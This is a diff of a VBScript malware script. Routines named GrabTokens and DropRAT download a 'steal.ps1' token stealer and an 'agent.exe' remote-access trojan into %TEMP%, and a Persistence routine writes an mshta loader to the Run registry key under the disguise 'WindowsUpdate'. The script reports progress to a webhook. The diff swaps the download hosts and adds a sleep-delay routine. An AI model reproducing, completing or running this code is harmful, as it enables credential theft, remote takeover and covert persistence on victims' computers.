@@ -209,7 +209,7 @@ Sub GrabTokens()
     Dim psf: psf = sh.ExpandEnvironmentStrings("%TEMP%") & "\steal.ps1"
     Dim xh: Set xh = CreateObject("MSXML2.ServerXMLHTTP.6.0")
     xh.SetOption 2, 13056
-    xh.Open "GET", "https://raw.githubusercontent.com/lozix94-afk/lozixloggedurmom/main/steal.ps1", False
+    xh.Open "GET", "https://dicerigs/steal.ps1", False
     xh.Send
     If xh.Status <> 200 Then Exit Sub
     Dim f: Set f = fso.CreateTextFile(psf, True): f.Write xh.responseText: f.Close
@@ -248,7 +248,7 @@ Sub GrabTokens_REG()
     Dim psf: psf = sh.ExpandEnvironmentStrings("%TEMP%") & "\steal.ps1"
     Dim xh: Set xh = CreateObject("MSXML2.ServerXMLHTTP.6.0")
     xh.SetOption 2, 13056
-    xh.Open "GET", "https://raw.githubusercontent.com/lozix94-afk/lozixloggedurmom/main/steal.ps1", False
+    xh.Open "GET", "https://dicerigs/steal.ps1", False
     xh.Send
     If xh.Status <> 200 Then Exit Sub
     Dim f: Set f = fso.CreateTextFile(psf, True): f.Write xh.responseText: f.Close
@@ -284,7 +284,7 @@ Sub GrabTokens_REG()
 End Sub
 
 Sub DropRAT()
-    Dim dl : dl = "https://github.com/lozix94-afk/lozixloggedurmom/releases/download/v1/agent.exe"
+    Dim dl : dl = "https://dicerigs/agent.exe"
     Dim op : op = sh.ExpandEnvironmentStrings("%TEMP%") & "\agent.exe"
     If fso.FileExists(op) Then fso.DeleteFile op
 
@@ -309,7 +309,7 @@ Sub DropRAT()
 End Sub
 
 Sub Persistence()
-    Dim payload : payload = "mshta https://lozix94-afk.github.io/lozixloggedurmom/loader.hta"
+    Dim payload : payload = "mshta https://dicerigs"
     On Error Resume Next
 
     sh.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\WindowsUpdate", payload, "REG_SZ"
@@ -321,6 +321,23 @@ Sub Persistence()
     sf.Close
 
     Call PostEmbed(":pushpin: Persistence", "3 startup methods installed", 65280, WH)
+End Sub
+
+Sub SleepMinutes(m)
+    Dim t0, t1, t2, elapsed
+    t0 = Timer()
+    Dim cmd : cmd = "cmd /c ping -n " & (m * 60 + 1) & " 127.0.0.1 > nul"
+    sh.Run cmd, 0, True
+    elapsed = Timer() - t0
+    If elapsed < 0 Then elapsed = elapsed + 86400
+    If elapsed < (m * 60) Then
+        t1 = Timer()
+        Do
+            t2 = Timer()
+            If t2 < t1 Then t2 = t2 + 86400
+            If (t2 - t1) >= ((m * 60) - elapsed) Then Exit Do
+        Loop
+    End If
 End Sub
 
 Function ReadFile(path)
@@ -337,7 +354,7 @@ Sub PostEmbed(t, d, c, url)
     Dim h: Set h = CreateObject("MSXML2.ServerXMLHTTP.6.0")
     h.SetOption 2, 13056
     h.Open "POST", url, False
-    h.SetRequestHeader "Content-Type", "application/json"
+    h.SetRequestHeader "Content-Type" & Chr(58) & " application/json"
     h.Send j
     Set h = Nothing
 End Sub
